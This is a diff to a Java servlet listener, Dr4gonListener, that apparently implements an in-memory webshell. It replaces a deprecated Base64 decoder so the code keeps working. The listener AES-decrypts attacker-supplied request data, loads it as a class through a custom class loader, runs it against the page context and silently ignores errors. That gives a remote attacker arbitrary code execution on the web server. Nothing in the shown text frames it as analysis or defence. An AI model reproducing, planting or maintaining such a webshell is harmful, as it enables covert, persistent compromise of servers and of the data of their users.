@@ -13,6 +13,7 @@ import javax.servlet.jsp.PageContext;
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
 import java.lang.reflect.Field;
+import java.util.Base64;
 
 
 public class Dr4gonListener implements ServletRequestListener {
@@ -58,7 +59,7 @@ public class Dr4gonListener implements ServletRequestListener {
                 session.putValue("u", k);
                 Cipher c = Cipher.getInstance("AES");
                 c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
-                new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);
+                new U(this.getClass().getClassLoader()).g(c.doFinal(Base64.getDecoder().decode(request.getReader().readLine()))).newInstance().equals(pageContext);
             }
         } catch (Exception ignored) {
         }
